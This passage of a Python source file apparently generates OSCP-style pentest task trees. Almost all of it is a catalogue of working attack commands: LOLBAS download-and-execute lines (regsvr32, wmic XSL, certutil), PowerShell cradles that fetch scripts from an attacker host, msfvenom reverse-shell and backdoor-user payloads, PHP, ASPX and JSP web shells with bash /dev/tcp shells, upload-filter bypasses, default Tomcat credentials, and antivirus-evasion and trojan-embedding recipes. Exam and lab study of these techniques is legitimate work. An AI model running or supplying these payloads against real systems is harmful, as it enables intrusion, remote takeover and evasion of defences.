                            '/i:http://...': 'Install from URL (loads SCT scriptlet)',
                            'scrobj.dll': 'Script object DLL'
                        },
                        'success_indicators': [
                            'SCT downloads and executes silently',
                            'Shell callback received',
                            'Signed binary (regsvr32) evades detection'
                        ],
                        'failure_indicators': [
                            'Defender blocks (often detected)',
                            'Cannot download SCT',
                            'Scriptlet execution disabled'
                        ],
                        'next_steps': [
                            'Use Metasploit: use multi/script/web_delivery, set target 3',
                            'Try DLL hijacking for persistence',
                            'Alternative LOLBAS: mshta, wmic'
                        ],
                        'alternatives': [
                            'WebDAV: regsvr32 /u /n /s /i:\\\\<LHOST>\\share\\payload.sct scrobj.dll',
                            'Metasploit: use multi/script/web_delivery, set target 3, set payload windows/meterpreter/reverse_tcp',
                            'Local: regsvr32 /u /s /i:C:\\temp\\payload.sct scrobj.dll'
                        ],
                        'notes': 'Often detected by Defender. Metasploit generates full command. SCT format same as rundll32. Listener: nc -lvnp 4444',
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': 'wmic-xsl-shell',
                    'name': 'WMIC XSL Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'wmic os get /format:"http://<LHOST>/payload.xsl"',
                        'description': 'Execute XSL stylesheet via WMIC (LOLBAS, stealthier)',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS', 'LOLBAS', 'STEALTH'],
                        'flag_explanations': {
                            'wmic': 'Windows Management Instrumentation Command-line (LOLBAS)',
                            'os get': 'Query OS information (benign-looking)',
                            '/format:"http://..."': 'Apply XSL transformation (code execution)'
                        },
                        'success_indicators': [
                            'XSL downloads and executes',
                            'Shell callback received',
                            'NOT detected by Defender (stealthier than mshta/rundll32)'
                        ],
                        'failure_indicators': [
                            'WMIC removed (Windows 11 deprecation)',
                            'Cannot download XSL',
                            'Proxy blocks connection'
                        ],
                        'next_steps': [
                            'Use for initial foothold (bypasses many AVs)',
                            'Migrate to more stable shell',
                            'Check WMIC availability: wmic /?'
                        ],
                        'alternatives': [
                            'Koadic: use stager/wmic (generates full command)',
                            'Manual XSL with PowerShell payload',
                            'If WMIC removed (Win11), try mshta or certutil'
                        ],
                        'notes': 'NOT detected by Defender as of 2019. Being deprecated in Windows 11. XSL format: <?xml version=\'1.0\'?><stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" version="1.0"><ms:script implements-prefix="user" language="JScript"><![CDATA[var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/shell.ps1\')");]]></ms:script></stylesheet>',
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # Advanced Windows shells
        tasks['children'].append({
            'id': 'advanced-windows-shells',
            'name': 'Advanced Windows Shells',
            'type': 'parent',
            'children': [
                {
                    'id': 'certutil-download-exec',
                    'name': 'Certutil Download and Execute',
                    'type': 'command',
                    'metadata': {
                        'command': 'certutil -urlcache -split -f http://<LHOST>/payload.exe payload.exe && payload.exe',
                        'description': 'Download executable using certutil (LOLBAS) and execute',
                        'tags': ['OSCP:HIGH', 'WINDOWS', 'LOLBAS'],
                        'flag_explanations': {
                            'certutil': 'Certificate utility (LOLBAS for file download)',
                            '-urlcache': 'URL cache operation',
                            '-split': 'Split output',
                            '-f': 'Force overwrite'
                        },
                        'success_indicators': [
                            'File downloads successfully',
                            'Executable runs',
                            'Reverse shell callback'
                        ],
                        'failure_indicators': [
                            'Defender blocks download',
                            'Defender blocks execution',
                            'Cannot reach web server'
                        ],
                        'next_steps': [
                            'Use msfvenom to generate payload.exe',
                            'Try encoding payload (base64 + certutil -decode)',
                            'Upload via other methods if detected'
                        ],
                        'alternatives': [
                            'Base64 encoded: certutil -urlcache -split -f http://<LHOST>/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe && payload.exe',
                            'PowerShell download: (New-Object Net.WebClient).DownloadFile("http://<LHOST>/payload.exe","payload.exe")',
                            'SMB: copy \\\\<LHOST>\\share\\payload.exe .'
                        ],
                        'notes': 'Often detected by Defender. Use encoding or obfuscation. Generate payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > payload.exe',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': 'nishang-powershell',
                    'name': 'Nishang PowerShell Reverse Shell',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Nishang Invoke-PowerShellTcp.ps1 for feature-rich PowerShell shell',
                        'tags': ['OSCP:HIGH', 'WINDOWS'],
                        'notes': [
                            'Nishang: https://github.com/samratashok/nishang',
                            '',
                            'SETUP:',
                            '1. Copy Invoke-PowerShellTcp.ps1 from Nishang/Shells/',
                            '2. Add to END of file:',
                            '   Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>',
                            '3. Start web server: python3 -m http.server 80',
                            '4. Start listener: nc -lvnp <LPORT>',
                            '',
                            'VICTIM EXECUTION:',
                            'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://<LHOST>/Invoke-PowerShellTcp.ps1\')"',
                            '',
                            'FEATURES:',
                            '- Interactive PowerShell shell',
                            '- File upload/download',
                            '- Port scanning',
                            '- More stable than one-liners',
                            '',
                            'DETECTION:',
                            'NOT detected by Defender (as of 2019)',
                            '',
                            'ALTERNATIVES:',
                            '- PowerCat (similar features)',
                            '- Empire (full C2 framework)',
                            '- Metasploit web_delivery'
                        ],
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': 'powercat',
                    'name': 'PowerCat PowerShell Swiss Army Knife',
                    'type': 'manual',
                    'metadata': {
                        'description': 'PowerCat: netcat alternative with PowerShell (many features)',
                        'tags': ['OSCP:HIGH', 'WINDOWS'],
                        'notes': [
                            'PowerCat: https://github.com/besimorhino/powercat',
                            '',
                            'DOWNLOAD AND EXECUTE:',
                            'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://<LHOST>/powercat.ps1\');powercat -c <LHOST> -p <LPORT> -e cmd"',
                            '',
                            'FEATURES:',
                            '- Reverse shell (TCP, UDP, DNS)',
                            '- Bind shell',
                            '- Port redirect',
                            '- File upload/download',
                            '- Generate payloads',
                            '- Serve files',
                            '',
                            'EXAMPLES:',
                            'Reverse shell: powercat -c <LHOST> -p <LPORT> -e cmd',
                            'Reverse PowerShell: powercat -c <LHOST> -p <LPORT> -ep',
                            'UDP reverse: powercat -c <LHOST> -p <LPORT> -ep -u',
                            'Bind shell: powercat -l -p 443 -e cmd',
                            'Generate payload: powercat -c <LHOST> -p <LPORT> -e cmd -g',
                            'Serve file: powercat -l -p 443 -i C:\\file.txt -rep',
                            '',
                            'DETECTION:',
                            'NOT detected by Defender (as of 2019)',
                            '',
                            'LISTENER:',
                            'nc -lvnp <LPORT>'
                        ],
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # MSFvenom shells
        tasks['children'].append({
            'id': 'msfvenom-windows',
            'name': 'MSFvenom Windows Payloads',
            'type': 'parent',
            'children': [
                {
                    'id': 'msfvenom-exe',
                    'name': 'MSFvenom Windows EXE Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > reverse.exe',
                        'description': 'Generate Windows executable reverse shell with msfvenom',
                        'tags': ['OSCP:HIGH', 'WINDOWS'],
                        'flag_explanations': {
                            '-p windows/meterpreter/reverse_tcp': 'Meterpreter reverse TCP payload',
                            'LHOST=': 'Attacker IP',
                            'LPORT=': 'Attacker port',
                            '-f exe': 'Output format (Windows executable)',
                            '> reverse.exe': 'Save to file'
                        },
                        'success_indicators': [
                            'EXE file generated',
                            'Meterpreter session opens when executed',
                            'Full post-exploitation features available'
                        ],
                        'failure_indicators': [
                            'Defender blocks download',
                            'Defender blocks execution',
                            'Meterpreter session dies immediately'
                        ],
                        'next_steps': [
                            'Upload EXE to target',
                            'Start Metasploit handler: use exploit/multi/handler',
                            'Set payload: set payload windows/meterpreter/reverse_tcp',
                            'Set LHOST and LPORT',
                            'Run: exploit -j'
                        ],
                        'alternatives': [
                            'Staged: -p windows/shell/reverse_tcp (smaller)',
                            'Stageless: -p windows/shell_reverse_tcp (single payload)',
                            'Encoded: -e x86/shikata_ga_nai -i 3 (AV evasion)',
                            'Embedded: -x /usr/share/windows-binaries/plink.exe -f exe (trojan)',
                            'Add user: -p windows/adduser USER=hacker PASS=password123'
                        ],
                        'notes': 'Often detected by Defender. Use encoding or embedding. Upload: certutil, PowerShell, SMB, FTP. Listener: msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; exploit"',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': 'msfvenom-dll',
                    'name': 'MSFvenom Windows DLL Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > reverse.dll',
                        'description': 'Generate Windows DLL for DLL hijacking or rundll32 execution',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS'],
                        'flag_explanations': {
                            '-f dll': 'Output as Windows DLL'
                        },
                        'success_indicators': [
                            'DLL generated successfully',
                            'Executes via rundll32 or DLL hijacking',
                            'Meterpreter session opens'
                        ],
                        'failure_indicators': [
                            'DLL not loaded',
                            'Defender blocks',
                            'Wrong export function'
                        ],
                        'next_steps': [
                            'Execute: rundll32 reverse.dll,0',
                            'Or: use for DLL hijacking',
                            'Or: regsvr32 /s /u reverse.dll'
                        ],
                        'alternatives': [
                            'rundll32 \\\\<LHOST>\\share\\reverse.dll,entrypoint',
                            'Metasploit: use windows/smb/smb_delivery (auto-generates)',
                            'Reflective DLL injection'
                        ],
                        'notes': 'Execute: rundll32 reverse.dll,0. For DLL hijacking, name as vulnerable DLL. Listener: msfconsole handler',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': 'msfvenom-msi',
                    'name': 'MSFvenom Windows MSI Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi > reverse.msi',
                        'description': 'Generate MSI installer for reverse shell',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS'],
                        'flag_explanations': {
                            '-f msi': 'Output as Windows Installer package'
                        },
                        'success_indicators': [
                            'MSI executes silently',
                            'Meterpreter session opens',
                            'Runs with SYSTEM privileges if AlwaysInstallElevated'
                        ],
                        'failure_indicators': [
                            'MSI blocked by admin policy',
                            'Defender blocks execution',
                            'User cancels installation'
                        ],
                        'next_steps': [
                            'Execute: msiexec /quiet /i reverse.msi',
                            'Check AlwaysInstallElevated for privesc',
                            'Remote: msiexec /quiet /i \\\\<LHOST>\\share\\reverse.msi'
                        ],
                        'alternatives': [
                            'Remote SMB: msiexec /quiet /i \\\\<LHOST>\\share\\reverse.msi',
                            'HTTP: msiexec /quiet /i http://<LHOST>/reverse.msi',
                            'Check privesc: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
                        ],
                        'notes': 'Execute: msiexec /quiet /i reverse.msi. If AlwaysInstallElevated=1, runs as SYSTEM. Often detected. Listener: msfconsole handler',
                        'estimated_time': '2-3 minutes'
                    }
                }
            ]
        })

        # LOLBAS reference
        tasks['children'].append({
            'id': 'lolbas-reference',
            'name': 'LOLBAS Windows Binaries Reference',
            'type': 'manual',
            'metadata': {
                'description': 'Living Off The Land Binaries and Scripts (LOLBAS) for Windows',
                'tags': ['OSCP:HIGH', 'WINDOWS', 'REFERENCE'],
                'notes': [
                    'LOLBAS Project: https://lolbas-project.github.io/',
                    '',
                    'CONCEPT:',
                    'Use signed Windows binaries for:',
                    '- Code execution',
                    '- File download',
                    '- Persistence',
                    '- UAC bypass',
                    '',
                    'COMMON LOLBAS BINARIES FOR SHELLS:',
                    '1. mshta.exe - Execute HTA files',
                    '2. rundll32.exe - Run DLL functions',
                    '3. regsvr32.exe - Register DLLs/scriptlets',
                    '4. wmic.exe - WMI command execution',
                    '5. certutil.exe - Download files',
                    '6. bitsadmin.exe - Download files',
                    '7. msiexec.exe - Install MSI packages',
                    '8. powershell.exe - PowerShell execution',
                    '9. cscript.exe/wscript.exe - Run VBScript/JScript',
                    '10. msbuild.exe - Execute C# code',
                    '',
                    'WHY USE LOLBAS:',
                    '- Signed by Microsoft (trusted)',
                    '- Bypass application whitelisting',
                    '- Evade some AV/EDR',
                    '- No file drops (fileless)',
                    '',
                    'EXAM TIP:',
                    'If PowerShell blocked, try:',
                    '- mshta (most reliable)',
                    '- wmic (stealthiest)',
                    '- regsvr32 (Metasploit integration)',
                    '',
                    'REFERENCE:',
                    'https://lolbas-project.github.io/ (like GTFOBins for Windows)'
                ],
                'estimated_time': 'Reference only'
            }
        })

        return tasks

    def _get_web_shell_tasks(self, target: str, language: str = 'php') -> Dict[str, Any]:
        """Web-based reverse shell generation tasks"""
        tasks = {
            'id': 'web-reverse-shells',
            'name': f'Web Reverse Shell Generation: {target}',
            'type': 'parent',
            'children': []
        }

        # PHP reverse shell
        tasks['children'].append({
            'id': 'php-web-shell',
            'name': 'PHP Reverse Shell (File Upload)',
            'type': 'manual',
            'metadata': {
                'description': 'Generate PHP reverse shell for web application file upload',
                'tags': ['OSCP:HIGH', 'WEB', 'PHP'],
                'notes': [
                    'PENTESTMONKEY PHP REVERSE SHELL:',
                    'wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php',
                    '',
                    'SETUP:',
                    '1. Edit php-reverse-shell.php:',
                    '   $ip = \'<LHOST>\';',
                    '   $port = <LPORT>;',
                    '2. Upload to target web server',
                    '3. Start listener: nc -lvnp <LPORT>',
                    '4. Navigate to uploaded file: http://<target>/uploads/php-reverse-shell.php',
                    '',
                    'ALTERNATIVE (SIMPLE):',
                    'echo \'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'"); ?>\' > shell.php',
                    '',
                    'ONE-LINER (MSFVENOM):',
                    'msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php',
                    'Add <?php to beginning: echo \'<?php \' | tr -d \'\\n\' > final.php && cat shell.php >> final.php',
                    '',
                    'WEB SHELL (INTERACTIVE):',
                    '<?php system($_GET["cmd"]); ?>',
                    'Access: http://<target>/shell.php?cmd=whoami',
                    '',
                    'BYPASS UPLOAD FILTERS:',
                    '- Change extension: .php5, .phtml, .pht, .phps, .php3',
                    '- MIME type: image/jpeg (with PHP code)',
                    '- Double extension: shell.php.jpg',
                    '- Null byte: shell.php%00.jpg (old PHP)',
                    '- Case variation: shell.PhP',
                    '- Add image header: GIF89a; <?php ... ?>',
                    '',
                    'SUCCESS INDICATORS:',
                    '- File uploads successfully',
                    '- Reverse shell connects when accessed',
                    '- Shell has www-data or apache user',
                    '',
                    'NEXT STEPS:',
                    '- Upgrade to TTY: python -c \'import pty; pty.spawn("/bin/bash")\'',
                    '- Check sudo -l',
                    '- Upload LinPEAS for privesc'
                ],
                'estimated_time': '3-5 minutes'
            }
        })

        # ASP/ASPX shells
        tasks['children'].append({
            'id': 'asp-shell',
            'name': 'ASP/ASPX Reverse Shell (IIS Upload)',
            'type': 'command',
            'metadata': {
                'command': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx > shell.aspx',
                'description': 'Generate ASPX reverse shell for IIS web servers',
                'tags': ['OSCP:HIGH', 'WEB', 'WINDOWS', 'IIS'],
                'flag_explanations': {
                    '-f aspx': 'Output as ASP.NET web page',
                    '-p windows/meterpreter/reverse_tcp': 'Windows Meterpreter payload'
                },
                'success_indicators': [
                    'ASPX file uploads to IIS server',
                    'Meterpreter session when accessed',
                    'Shell runs as IIS user (often IIS APPPOOL\\DefaultAppPool)'
                ],
                'failure_indicators': [
                    'Upload blocked',
                    'File extension blacklisted',
                    'Antivirus blocks'
                ],
                'next_steps': [
                    'Upload shell.aspx',
                    'Start handler: msfconsole handler',
                    'Access: http://<target>/uploads/shell.aspx',
                    'Check IIS user privileges: whoami /all'
                ],
                'alternatives': [
                    'ASP (classic): msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp > shell.asp',
                    'Webshell: <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start("cmd","/c " + Request["cmd"]).WaitForExit(); %>',
                    'Try .aspx, .asp, .ashx extensions'
                ],
                'notes': 'For IIS servers. Often less filtered than PHP. Check upload restrictions. Listener: msfconsole handler',
                'estimated_time': '3-5 minutes'
            }
        })

        # JSP/WAR shells
        tasks['children'].append({
            'id': 'jsp-war-shell',
            'name': 'JSP/WAR Reverse Shell (Tomcat Upload)',
            'type': 'parent',
            'children': [
                {
                    'id': 'jsp-shell',
                    'name': 'JSP Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.jsp',
                        'description': 'Generate JSP reverse shell for Java web servers',
                        'tags': ['OSCP:HIGH', 'WEB', 'JAVA', 'TOMCAT'],
                        'flag_explanations': {
                            '-p java/jsp_shell_reverse_tcp': 'Java JSP reverse shell payload',
                            '-f raw': 'Raw JSP format'
                        },
                        'success_indicators': [
                            'JSP uploads to Tomcat/JBoss',
                            'Shell connects when JSP accessed',
                            'Runs as tomcat user'
                        ],
                        'failure_indicators': [
                            'JSP upload blocked',
                            'Java not executing payload',
                            'Tomcat manager authentication required'
                        ],
                        'next_steps': [
                            'Upload to webapps directory or via manager',
                            'Access: http://<target>/shell.jsp',
                            'Upgrade to meterpreter if possible'
                        ],
                        'alternatives': [
                            'WAR format (better for Tomcat)',
                            'Manual JSP: <%@ page import="java.io.*" %><% Process p=new ProcessBuilder("/bin/bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1").start(); %>',
                            'Use Tomcat manager to deploy WAR'
                        ],
                        'notes': 'For Tomcat, JBoss, WebLogic. WAR format more reliable. Listener: nc -lvnp 4444',
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': 'war-shell',
                    'name': 'WAR Reverse Shell (Tomcat Deploy)',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war',
                        'description': 'Generate WAR file for Tomcat manager deployment',
                        'tags': ['OSCP:HIGH', 'WEB', 'JAVA', 'TOMCAT'],
                        'flag_explanations': {
                            '-f war': 'Output as Web Application Archive (Tomcat deployment format)'
                        },
                        'success_indicators': [
                            'WAR deploys via Tomcat manager',
                            'Shell connects automatically',
                            'More reliable than JSP upload'
                        ],
                        'failure_indicators': [
                            'No Tomcat manager access',
                            'Authentication required',
                            'Deployment blocked'
                        ],
                        'next_steps': [
                            'Deploy via Tomcat manager: http://<target>:8080/manager/html',
                            'Or: curl --upload-file shell.war "http://tomcat:password@<target>:8080/manager/text/deploy?path=/shell"',
                            'Access: http://<target>:8080/shell/',
                            'Shell connects automatically'
                        ],
                        'alternatives': [
                            'Manual WAR: jar -cvf shell.war shell.jsp',
                            'Metasploit: use exploit/multi/http/tomcat_mgr_upload',
                            'Try default credentials: tomcat/tomcat, admin/admin, tomcat/s3cret'
                        ],
                        'notes': 'Best for Tomcat. Requires manager access or upload vulnerability. Listener: nc -lvnp 4444',
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # NodeJS shell
        tasks['children'].append({
            'id': 'nodejs-shell',
            'name': 'NodeJS Reverse Shell',
            'type': 'command',
            'metadata': {
                'command': 'msfvenom -p nodejs/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw',
                'description': 'Generate NodeJS reverse shell for Node.js applications',
                'tags': ['OSCP:MEDIUM', 'WEB', 'NODEJS'],
                'flag_explanations': {
                    '-p nodejs/shell_reverse_tcp': 'NodeJS reverse shell payload',
                    '-f raw': 'Raw JavaScript format'
                },
                'success_indicators': [
                    'JavaScript executes in Node.js context',
                    'Shell connects with full Node.js environment',
                    'Can use require() and Node.js APIs'
                ],
                'failure_indicators': [
                    'Node.js not running',
                    'RCE context doesn\'t allow require()',
                    'Sandboxed environment'
                ],
                'next_steps': [
                    'Inject into vulnerable Node.js endpoint',
                    'Use for prototype pollution RCE',
                    'Check for command injection vulnerabilities'
                ],
                'alternatives': [
                    'Manual: require(\'child_process\').exec(\'nc <LHOST> <LPORT> -e /bin/bash\')',
                    'Bash: require(\'child_process\').exec("bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'")',
                    'Constructor bypass: "".sub.constructor("console.log(global.process.mainModule.constructor._load(\\"child_process\\").execSync(\\"id\\").toString())")()'
                ],
                'notes': 'For Node.js RCE (SSTI, prototype pollution, command injection). Listener: nc -lvnp 4444',
                'estimated_time': '2-3 minutes'
            }
        })

        return tasks

    def _get_msfvenom_reference_tasks(self, target: str = 'generic') -> Dict[str, Any]:
        """MSFvenom payload generation reference tasks"""
        tasks = {
            'id': 'msfvenom-reference',
            'name': 'MSFvenom Payload Generation Reference',
            'type': 'parent',
            'children': []
        }

        # MSFvenom basics
        tasks['children'].append({
            'id': 'msfvenom-basics',
            'name': 'MSFvenom Basics and Common Options',
            'type': 'manual',
            'metadata': {
                'description': 'Essential msfvenom commands and options for OSCP',
                'tags': ['OSCP:HIGH', 'REFERENCE'],
                'notes': [
                    'MSFVENOM SYNTAX:',
                    'msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP> LPORT=<PORT>',
                    '',
                    'ESSENTIAL OPTIONS:',
                    '-p <PAYLOAD>        Payload to use (e.g., windows/meterpreter/reverse_tcp)',
                    '-f <FORMAT>         Output format (exe, elf, war, asp, aspx, php, etc.)',
                    '-e <ENCODER>        Encoder for AV evasion (e.g., x86/shikata_ga_nai)',
                    '-i <COUNT>          Encoding iterations (default: 1, recommended: 3-5)',
                    '-a <ARCH>           Architecture (x86, x64)',
                    '--platform <OS>     Platform (windows, linux, osx)',
                    '-o <FILE>           Output file',
                    '-b "\\x00\\x0a\\x0d" Bad characters to avoid',
                    '',
                    'COMMON PARAMETERS:',
                    'LHOST=<IP>          Attacker IP',
                    'LPORT=<PORT>        Attacker port',
                    'EXITFUNC=thread     Exit method (cleaner process termination)',
                    'PrependSetuid=True  Use SUID for privilege retention (Linux)',
                    '',
                    'LIST PAYLOADS/ENCODERS:',
                    'msfvenom -l payloads        List all payloads',
                    'msfvenom -l encoders        List all encoders',
                    'msfvenom -l formats         List output formats',
                    '',
                    'USEFUL FLAGS:',
                    '-x <FILE>           Embed payload in legitimate executable (Trojan)',
                    '-k                  Keep original executable behavior',
                    '-c <SHELLCODE>      Custom shellcode',
                    '-s <MAX>            Maximum payload size',
                    '',
                    'COMMON BAD CHARACTERS:',
                    '\\x00  Null byte (most common)',
                    '\\x0a  Line feed (LF)',
                    '\\x0d  Carriage return (CR)',
                    '\\x20  Space',
                    '',
                    'EXAMPLES:',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe',
                    'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf',
                    'msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php',
                    '',
                    'LISTENER SETUP:',
                    'msfconsole -q',
                    'use exploit/multi/handler',
                    'set payload <PAYLOAD>',
                    'set LHOST <IP>',
                    'set LPORT <PORT>',
                    'exploit -j'
                ],
                'estimated_time': 'Reference only'
            }
        })

        # Platform-specific payloads
        tasks['children'].append({
            'id': 'msfvenom-platforms',
            'name': 'MSFvenom Platform-Specific Payloads',
            'type': 'manual',
            'metadata': {
                'description': 'Common msfvenom payloads for different platforms',
                'tags': ['OSCP:HIGH', 'REFERENCE'],
                'notes': [
                    '=== WINDOWS PAYLOADS ===',
                    '',
                    'Reverse shell (staged):',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe',
                    '',
                    'Reverse shell (stageless, larger but stable):',
                    'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe',
                    '',
                    'Bind shell:',
                    'msfvenom -p windows/meterpreter/bind_tcp RHOST=<TARGET> LPORT=<PORT> -f exe > bind.exe',
                    '',
                    'Add user (backdoor):',
                    'msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe > adduser.exe',
                    '',
                    'Execute command:',
                    'msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell IEX(New-Object Net.webClient).downloadString(\'http://<IP>/shell.ps1\')" -f exe > exec.exe',
                    '',
                    'Encoded (AV evasion):',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe',
                    '',
                    'Embedded in legitimate EXE (Trojan):',
                    'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o trojan.exe',
                    '',
                    '=== LINUX PAYLOADS ===',
                    '',
                    'Reverse shell (x86):',
                    'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf',
                    '',
                    'Reverse shell (x64):',
                    'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf',
                    '',
                    'Bind shell:',
                    'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<TARGET> LPORT=<PORT> -f elf > bind.elf',
                    '',
                    '=== MAC PAYLOADS ===',
                    '',
                    'Reverse shell:',
                    'msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho',
                    '',
                    'Bind shell:',
                    'msfvenom -p osx/x86/shell_bind_tcp RHOST=<TARGET> LPORT=<PORT> -f macho > bind.macho',
                    '',
                    '=== WEB PAYLOADS ===',
                    '',
                    'PHP:',
                    'msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php',
                    'echo \'<?php \' | tr -d \'\\n\' > shell.php && cat shell.php >> shell.php',
                    '',
                    'ASP:',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp',
                    '',
                    'ASPX:',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx',
                    '',
                    'JSP:',
                    'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp',
                    '',
                    'WAR (Tomcat):',
                    'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war',
                    '',
                    'NodeJS:',
                    'msfvenom -p nodejs/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw',
                    '',
                    '=== SCRIPTING PAYLOADS ===',
                    '',
                    'Python:',
                    'msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py',
                    '',
                    'Perl:',
                    'msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl',
                    '',
                    'Bash:',
                    'msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh'
                ],
                'estimated_time': 'Reference only'
            }
        })

        # Encoding and evasion
        tasks['children'].append({
            'id': 'msfvenom-evasion',
            'name': 'MSFvenom Encoding and AV Evasion',
            'type': 'manual',
            'metadata': {
                'description': 'Techniques for evading antivirus with msfvenom',
                'tags': ['OSCP:MEDIUM', 'REFERENCE'],
                'notes': [
                    'AV EVASION TECHNIQUES:',
                    '',
                    '1. ENCODING:',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe',
                    '',
                    'Common encoders:',
                    '- x86/shikata_ga_nai   (best, polymorphic)',
                    '- x86/call4_dword_xor',
                    '- x64/xor_dynamic',
                    '',
                    '2. EMBEDDING IN LEGITIMATE EXE:',
                    'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -k -o trojan.exe',
                    '',
                    'Flags:',
                    '-x <FILE>  Embed in legitimate executable',
                    '-k         Keep original executable behavior',
                    '',
                    '3. BAD CHARACTER AVOIDANCE:',
                    'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\\x00\\x0a\\x0d" -f exe > shell.exe',
                    '',
                    '4. CUSTOM TEMPLATES:',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -x template.exe -f exe > custom.exe',
                    '',
                    '5. FORMAT SELECTION:',
                    '- Use uncommon formats (vbs, hta, dll)',
                    '- Obfuscate with -f psh-cmd (PowerShell encoded)',
                    '',
                    '6. SHELLCODE OUTPUT:',
                    'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c',
                    '- Inject into custom executable',
                    '- Combine with encryption',
                    '',
                    'LIMITATIONS:',
                    '- Encoding alone rarely bypasses modern AV',
                    '- Use as starting point, add obfuscation',
                    '- Test with https://antiscan.me/ (NOT VirusTotal)',
                    '- Consider custom payloads for exam',
                    '',
                    'EXAM TIP:',
                    'If msfvenom detected:',
                    '1. Try encoding (quick attempt)',
